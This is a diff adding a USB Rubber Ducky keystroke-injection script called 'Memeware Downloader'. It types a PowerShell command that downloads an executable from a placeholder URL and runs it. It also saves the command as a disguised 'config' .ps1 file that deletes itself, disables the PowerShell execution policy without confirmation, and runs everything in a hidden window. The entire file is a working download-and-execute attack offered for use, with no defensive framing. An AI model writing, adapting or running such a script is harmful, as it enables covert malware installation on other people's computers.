@@ -1,0 +1,36 @@
+REM Memeware Downloader is a ducky script that downloads a file from a URL and executes it within Windows. This program has been tested and working on the following Versions of Windows; 
+REM The following permissions must be allowed for this to execute on Windows; Powershell Version 2+, Internet Access.
+DELAY 200
+REM Open Windows Run Dialog
+GUI r 
+DELAY 1000
+REM Open notepad via Powershell
+STRING powershell Start-Process notepad
+ENTER
+DELAY 1000
+REM This is the script that will download and execute our payload.
+STRING (New-Object Net.Webclient).DownloadFile('http://URL',"C:\Users\Public\43461.exe"); Start-Process -FilePath "C:\Users\Public\43461.exe"
+ENTER
+REM This will remove the script after we have executed the above command. 
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+REM This will save our file
+CTRL s
+DELAY 1000
+STRING C:\Users\Public\config-43461.ps1
+ENTER
+DELAY 1000
+ALT F4 
+DELAY 200
+REM This will open cmd via Powershell
+GUI r 
+DELAY 200  
+STRING powershell Start-Process cmd
+ENTER
+REM This will create a powershell instance within cmd to allow us to execute our script
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 200
+REM This will finally execute our script, and finish our command line execution. 
+STRING powershell.exe -windowstyle hidden -File C:\Users\Public\config-43461.ps1
+ENTER
